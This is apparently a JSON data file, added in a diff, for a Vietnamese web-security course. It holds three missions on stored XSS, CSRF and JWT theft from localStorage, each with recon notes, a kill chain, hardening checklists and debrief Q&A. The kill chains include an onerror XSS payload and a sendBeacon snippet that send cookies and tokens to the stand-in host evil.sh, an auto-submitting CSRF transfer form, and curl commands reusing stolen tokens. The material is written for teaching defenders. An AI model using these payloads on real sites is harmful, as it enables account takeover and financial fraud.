@@ -1,0 +1,184 @@
+{
+  "trackSlug": "web-security-and-auth-masterclass",
+  "missions": [
+    {
+      "id": "ws-mis-01",
+      "slug": "stored-xss-session-heist",
+      "title": "Chiến dịch 01 · Đánh cắp session hàng loạt bằng Stored XSS",
+      "summary": "Từ một ô bình luận vô hại đến chiếm 1.284 session: walkthrough đầy đủ cách stored XSS hoạt động, vì sao React auto-escaping vẫn bị vượt, và playbook phòng chống nhiều lớp.",
+      "objective": "Giành quyền truy cập trình duyệt của mọi user xem trang, exfiltrate cookie và duy trì quyền điều khiển mà không cần password.",
+      "difficulty": "advanced",
+      "estimatedMinutes": 25,
+      "vectorIds": ["ws-vec-01"],
+      "rootCause": "XSS tồn tại khi dữ liệu người dùng được đưa vào HTML parser context mà không qua bước context-aware encoding. dangerouslySetInnerHTML tắt hoàn toàn cơ chế auto-escape của React — chuỗi bạn truyền được parser browser xử lý như markup thật. Sâu hơn: lỗi không nằm ở 'quên escape' mà ở việc NHẬP DIỆN dữ liệu không rõ nguồn vào ngữ cảnh nguy hiểm; escaping chỉ là một trong nhiều biên phòng (output encoding, CSP, Trusted Types, HttpOnly cookie giới hạn thiệt hại).",
+      "reconNotes": [
+        "Rà các điểm render rich-text: comment, bio, tên file, UGC markdown — tìm chỗ dùng dangerouslySetInnerHTML hoặc innerHTML.",
+        "Kiểm tra CSP header: nếu không có script-src strict/nonces → inline handler vẫn sống.",
+        "Thử payload vô hại <b>test</b> trước: nếu in đậm thật sự → renderer đang ăn raw HTML.",
+        "Xem cookie có HttpOnly không: document.cookie còn đọc được gì để đánh cắp."
+      ],
+      "killChain": [
+        {
+          "title": "1 · Thăm dò bề mặt tấn công",
+          "detail": "Đăng ký tài khoản thường, post bình luận chứa markup lành tính để xác nhận renderer không escape.",
+          "code": "POST /api/comments { \"text\": \"<b>hello</b>\" }\n→ hiển thị đậm = raw HTML pipeline"
+        },
+        {
+          "title": "2 · Vũ khí hóa payload",
+          "detail": "Chuyển sang payload thực thụ: img onerror không cần <script> tag (thường đã bị filter) và tự động kích hoạt khi ảnh lỗi.",
+          "code": "<img src=x onerror=\"fetch('https://evil.sh/c?'+encodeURIComponent(document.cookie))\">"
+        },
+        {
+          "title": "3 · Đặt bẫy và chờ",
+          "detail": "Payload được lưu vào DB → mọi user mở trang đều tải comment và trình duyệt họ tự chạy mã độc. Không cần phishing link nào nữa — nạn nhân tự đến tận nơi.",
+          "code": "-- SELECT count(*) FROM comments WHERE id=1337;\n-- payload giờ phục vụ ~40.000 pageview/ngày"
+        },
+        {
+          "title": "4 · Thu hoạch & leo thang",
+          "detail": "Cookie session bay về collector. Với session đó, attacker gọi API như chính nạn nhân: đổi email, tạo API key, xuất dữ liệu.",
+          "code": "$ curl https://api.myapp.com/me -H 'Cookie: session=sid_9f2a…'\n{ \"email\": \"victim@corp.com\", \"role\": \"member\" }"
+        }
+      ],
+      "hardeningChecklist": [
+        "Cấm dangerouslySetInnerHTML với input user; nếu bắt buộc, sanitize bằng DOMPurify với whitelist tag tối thiểu.",
+        "Set Content-Security-Policy: script-src theo nonce/hash — chặn toàn bộ inline handler kể cả khi escape hỏng.",
+        "Cookie phiên đặt HttpOnly + Secure + SameSite=Lax: XSS vẫn xảy ra nhưng không lấy được credential.",
+        "Escape THEO NGỮ CẢNH (HTML body, attribute, URL, JS) — không dùng một hàm escape chung chung cho mọi nơi.",
+        "Bật Trusted Types ở báo cáo-then-enforce để innerHTML risk phải đi qua policy.",
+        "Review dependency: một npm package render markdown/html cũng là bề mặt XSS."
+      ],
+      "debrief": [
+        {
+          "question": "React đã auto-escape rồi, tại sao vẫn bị XSS?",
+          "answer": "Auto-escape chỉ áp dụng khi text đi qua {} làm TEXT NODE. dangerouslySetInnerHTML, href='javascript:', hay attribute event do dev tự nối chuỗi đều đi vòng qua lớp bảo vệ đó."
+        },
+        {
+          "question": "Nếu đã escape chuẩn thì còn cần CSP không?",
+          "answer": "Cần. Defense-in-depth: escape là lớp 1, CSP chặn mọi script ngoài whitelist là lớp 2, HttpOnly cookie giới hạn hậu quả là lớp 3. Một lớp hỏng không đồng nghĩa hệ thống sụp."
+        },
+        {
+          "question": "Vì sao payload dùng <img onerror> thay vì <script>?",
+          "answer": "<script> injected sau khi trang parse sẽ không tự chạy lại trong nhiều kịch bản, và là thứ đầu tiên bị filter. Event handler trên element hợp lệ (img/svg/body) kích hoạt trong vòng parse đời thường — khó bị lọc hơn."
+        }
+      ]
+    },
+    {
+      "id": "ws-mis-02",
+      "slug": "csrf-transfer-fraud-op",
+      "title": "Chiến dịch 02 · CSRF: rút tiền hộ nạn nhân không cần password",
+      "summary": "Lừa trình duyệt tự khai thác chính cookie của nạn nhân: phân tích SameSite, xây trang attack tự submit, và bộ ba phòng thủ Origin-check + CSRF token + SameSite.",
+      "objective": "Thực hiện một giao dịch state-changing từ trình duyệt nạn nhân mà không biết password, không cần XSS, chỉ dựa vào hành vi tự động gắn cookie của trình duyệt.",
+      "difficulty": "advanced",
+      "estimatedMinutes": 20,
+      "vectorIds": ["ws-vec-02"],
+      "rootCause": "Cookie là mô hình xác thực 'ambient': trình duyệt TỰ ĐỘNG đính kèm cho mọi request tới domain tương ứng, bất kể request khởi phát từ đâu. Server nhìn thấy cookie hợp lệ nên tin request là ý muốn của user. Lỗ hổng nằm ở chỗ server KHÔNG phân biệt được 'request mang cookie của nạn nhân' với 'request được nạn nhân chủ động thực hiện' — hai thứ này chỉ trùng nhau khi origin của initiator được kiểm tra.",
+      "reconNotes": [
+        "Liệt kê các endpoint state-changing: transfer, đổi email, xóa tài khoản, thêm địa chỉ.",
+        "Quan sát cookie session: SameSite=None hay thiếu thuộc tính = cửa rộng mở cho cross-site POST.",
+        "Kiểm tra server có đọc Origin/Referer header không: gửi request thiếu header xem có bị chặn.",
+        "Tìm endpoint GET làm thay đổi trạng thái (GET /logout, GET /delete?id=) — dễ khai thác nhất."
+      ],
+      "killChain": [
+        {
+          "title": "1 · Chọn mục tiêu và dựng form ma",
+          "detail": "Sao chép chính xác method + field của endpoint transfer vào form ẩn trên trang attacker, set giá trị hưởng lợi cho mình.",
+          "code": "<form action=\"https://mybank.com/api/users/transfer\" method=\"POST\">\n  <input name=\"to\" value=\"attacker\">\n  <input name=\"amount\" value=\"5000000\">\n</form>"
+        },
+        {
+          "title": "2 · Tự động hóa nộp đơn",
+          "detail": "onload submit ngay — nạn nhân chỉ cần mở trang trong lúc còn đăng nhập mybank.com. Không có click thứ hai, không có cảnh báo nào.",
+          "code": "<body onload=\"document.forms[0].submit()\">\n  <!-- nội dung giả: 'Quiz vui 2024 – câu 1/10...' -->\n</body>"
+        },
+        {
+          "title": "3 · Vượt các biến thể phòng thủ yếu",
+          "detail": "Nếu server chỉ chặn referer rỗng, attacker thêm rel=noopener/meta referrer để referer vẫn trông 'chuẩn'. Nếu token nằm trong cookie nhưng không so với header → double-submit bypass bằng cách set cả hai.",
+          "code": "<meta name=\"referrer\" content=\"unsafe-url\">\n<!-- hoặc: fetch với credentials:'include' + token đọc được từ cookie nếu không HttpOnly -->"
+        },
+        {
+          "title": "4 · Thu lợi và xóa dấu vết",
+          "detail": "Request thành công 200 OK trong access log — nhìn y như user thật thao tác. Phát hiện chỉ xảy ra khi nạn nhân đối chiếu sao kê.",
+          "code": "access.log: POST /api/users/transfer 200 12ms ip=victim-ip\n# không anomaly, không alert — fraud được phát hiện thủ công"
+        }
+      ],
+      "hardeningChecklist": [
+        "SameSite=Lax (tối thiểu) cho mọi auth cookie; Strict cho các action nhạy cảm.",
+        "Server-side: từ chối state-changing request khi Origin/Referer không khớp whitelist tuyệt đối.",
+        "Anti-CSRF token kiểu synchronizer/double-submit, regenerate theo session; token phải sống ở nơi JS trang khác không đọc được nếu không cần thiết.",
+        "Cấm tuyệt đối state-changing qua GET; idempotency-key cho các giao dịch tiền.",
+        "Re-authentication (nhập lại mật khẩu/OTP) cho action rủi ro cao: chuyển tiền, đổi email chủ tài khoản.",
+        "Giám sát hành vi: alert khi transfer đến account mới lần đầu ngay sau một pageview từ external referrer."
+      ],
+      "debrief": [
+        {
+          "question": "SameSite=Lax chặn được hết CSRF không?",
+          "answer": "Không. Lax vẫn gửi cookie cho top-level navigation an toàn (GET). Nếu app có endpoint GET gây tác dụng phụ, hoặc dùng method POST nhưng qua pop-up/window.opener trick, vẫn còn mặt tấn công. Lax là lớp giảm thiệt hại, không phải vaccine."
+        },
+        {
+          "question": "Tại sao kiểm tra Origin header chưa đủ tin cậy?",
+          "answer": "Một số old browser/proxy strips Origin; và nếu ứng dụng có lỗ hổng XSS cùng domain, attacker gửi request same-origin với Origin hợp lệ — lúc đó cần CSRF token như lớp độc lập."
+        }
+      ]
+    },
+    {
+      "id": "ws-mis-03",
+      "slug": "jwt-localstorage-heist",
+      "title": "Chiến dịch 03 · JWT Heist: backdoor 30 ngày từ localStorage",
+      "summary": "Vì sao lưu token trong localStorage là quả bom nổ chậm: mô phỏng đường đánh cắp refresh token, duy trì truy cập vĩnh viễn qua rotation sai, và kiến trúc token đúng chuẩn.",
+      "objective": "Đánh cắp cặp access+refresh token từ localStorage và duy trì quyền truy cập dài hạn ngay cả khi nạn nhân đổi mật khẩu, nhờ refresh token không rotation/không revoke.",
+      "difficulty": "critical",
+      "estimatedMinutes": 22,
+      "vectorIds": ["ws-vec-03"],
+      "rootCause": "localStorage sinh ra để lưu dữ liệu, không phải secret: mọi JavaScript cùng origin đều đọc được, không có thuộc tính bảo vệ, sống sót qua logout nếu app không chủ động clear. Khi team đặt JWT vào đó, ranh giới bảo mật của ứng dụng hạ xuống 'không có XSS nào chạy được' — một giả định quá mong manh vì supply chain JS (npm, extension, CDN compromise) nằm ngoài tầm kiểm soát. Refresh token dài hạn trong localStorage biến MỘT lần lộ dữ liệu thành backdoor TRỰC TIẾP.",
+      "reconNotes": [
+        "Mở DevTools → Application → Local Storage: liệt kê key chứa token/profile.",
+        "Decode JWT (phần payload base64) xem exp/iat: access token sống bao lâu? Có refresh riêng không?",
+        "Thử logout rồi đọc lại storage: token cũ còn nằm đó nghĩa là app không dọn dẹp.",
+        "Kiểm tra refresh endpoint: gọi lại refresh token cũ lần 2 — nếu vẫn 200 → không rotation, không reuse-detection."
+      ],
+      "killChain": [
+        {
+          "title": "1 · Khai quật storage",
+          "detail": "Chỉ cần một XSS nhỏ, một extension nhiễm độc, hoặc một package npm độc trong bundle: vài dòng JS là đủ đọc toàn bộ token.",
+          "code": "const loot = {\n  at: localStorage.getItem('accessToken'),\n  rt: localStorage.getItem('refreshToken'),\n};\nnavigator.sendBeacon('https://evil.sh/loot', JSON.stringify(loot));"
+        },
+        {
+          "title": "2 · Nhập thân nạn nhân",
+          "detail": "Attacker dùng access token gọi API từ máy mình — không cần cookie, không cần device, CORS không chặn server-to-server.",
+          "code": "$ curl https://api.myapp.com/orders \\\n  -H 'Authorization: Bearer eyJhbGciOi...'"
+        },
+        {
+          "title": "3 · Bất tử hóa truy cập",
+          "detail": "Khi access hết hạn, dùng refresh token lấy cặp mới. Nếu server không rotation + không blacklist, refresh token giữ nguyên giá trị dùng mãi — nạn nhân đổi mật khẩu cũng vô hiệu.",
+          "code": "$ curl -X POST https://api.myapp.com/api/auth/refresh \\\n  -d '{\"refreshToken\":\"rt_stolen_9f2a\"}'\n→ { \"accessToken\": \"eyJ…mới\", \"refreshToken\": \"rt_stolen_9f2a\" } # unchanged!"
+        },
+        {
+          "title": "4 · Nạn nhân phản công (và thất bại)",
+          "detail": "Logout client-side chỉ xóa storage phía nạn nhân. Không có jti blacklist/revoke phía server, token đã lộ vẫn hợp lệ đến khi hết hạn tự nhiên — với refresh 30 ngày thì đó là 30 ngày backdoor.",
+          "code": "# victim: logout + change password\n$ curl .../refresh -d '{\"refreshToken\":\"rt_stolen_9f2a\"}'\n→ 200 OK   # vẫn sống! 💀"
+        }
+      ],
+      "hardeningChecklist": [
+        "Refresh token CHỈ sống trong HttpOnly + Secure + Path=/api/auth cookie — JS không bao giờ chạm được.",
+        "Access token ngắn hạn (5–15 phút), lưu in-memory; chấp nhận re-login/refresh im lặng.",
+        "Refresh Token Rotation bắt buộc: mỗi lần dùng, cấp cặp mới + thu hồi cái cũ; phát hiện reuse → revoke toàn bộ family.",
+        "Lưu metadata thiết bị cho từng refresh session: cho phép user xem và đăng xuất từng thiết bị từ UI.",
+        "Đổi mật khẩu → revoke tất cả refresh sessions của user (trừ session hiện tại).",
+        "Không bao giờ persist token vào localStorage/sessionStorage dù 'chỉ tạm thời cho demo'."
+      ],
+      "debrief": [
+        {
+          "question": "HttpOnly chặn JS đọc cookie, vậy XSS còn nguy hiểm gì?",
+          "answer": "Vẫn nguy hiểm: XSS chạy request TRONG trình duyệt nạn nhân, cookie tự đính kèm — attacker không cần đọc token, chỉ cần mượn tay trình duyệt. Nhưng HttpOnly loại bỏ kịch bản 'đánh cắp token dùng lâu dài từ xa', thu hẹp cửa sổ tấn công từ 30 ngày xuống đúng một phiên."
+        },
+        {
+          "question": "Rotation chống lại điều gì cụ thể?",
+          "answer": "Reuse-detection: khi refresh token A đã dùng bị dùng lần nữa, chắc chắn có bản sao trái phép → server khóa cả family token. Đây là cơ chế phát hiện mất mát, không chỉ là thay đổi giá trị."
+        },
+        {
+          "question": "Có nên mã hóa token trước khi lưu localStorage?",
+          "answer": "Không giải quyết được gốc rễ: key mã hóa cũng nằm trong JS, attacker đọc được cả hai. Mã hóa che giấu giá trị khỏi mắt thường, không chống lại code execution cùng origin."
+        }
+      ]
+    }
+  ]
+}
